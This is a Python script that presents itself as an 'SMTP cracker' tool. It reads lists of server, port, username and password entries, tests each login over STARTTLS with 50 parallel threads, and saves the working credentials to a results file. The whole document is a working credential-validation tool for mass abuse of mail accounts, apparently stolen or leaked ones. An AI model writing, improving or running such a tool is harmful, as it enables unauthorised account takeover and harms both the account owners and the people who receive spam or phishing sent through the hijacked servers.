import smtplib
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Define colors
fr = Fore.RED
fg = Fore.GREEN

# Banner
BANNER = f'''
    [+[+[+[+[+======================================+]+]+]+]+]
    
        █████████     ██████   ██████    ███████████    ███████████ 
    ███░░░░░███   ░░██████ ██████    ░█░░░███░░░█   ░░███░░░░░███
    ░███    ░░░     ░███░█████░███    ░   ░███  ░     ░███    ░███
    ░░█████████     ░███░░███ ░███        ░███        ░██████████ 
    ░░░░░░░░███    ░███ ░░░  ░███        ░███        ░███░░░░░░  
    ███    ░███    ░███      ░███        ░███        ░███        
    ░░█████████     █████     █████       █████       █████       
    ░░░░░░░░░     ░░░░░     ░░░░░       ░░░░░       ░░░░░        
                                                                                               
    [+[+[+[+[+======================================+]+]+]+]+] 
                                                  
                        SMTP CRACKER TOOL V0.1
            Check Smtps Server Ex: Server|port|user|pass on list   
            
    [+[+[+[+[+======================================+]+]+]+]+]
                                       
\n'''

# Success file
SUCCESS_FILE = "Result_Smtps.txt"

def check_smtp(server, port, username, password):
    try:
        server_conn = smtplib.SMTP(server, port)
        server_conn.starttls()
        server_conn.login(username, password)

        logger.info(f"SMTP server {server}:{port} - Smtp Work")

        with open(SUCCESS_FILE, 'a') as sf:
            sf.write(f"{server}|{port}|{username}|{password}\n")

        server_conn.quit()
        return True
    except Exception as e:
        logger.error(f"SMTP server {server}:{port} - Smtp Failed: {e}")
        return False

def main():
    print(BANNER)

    smtp_file = input("List Smtps: ")

    try:
        with open(smtp_file, 'r') as file:
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                for line in file:
                    server, port, username, password = line.strip().split('|')
                    port = int(port)

                    future = executor.submit(check_smtp, server, port, username, password)
                    futures.append(future)

                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        logger.error(f"Error: {e}")
    except FileNotFoundError:
        logger.error(f"Error: {smtp_file} not found.")

if __name__ == "__main__":
    main()
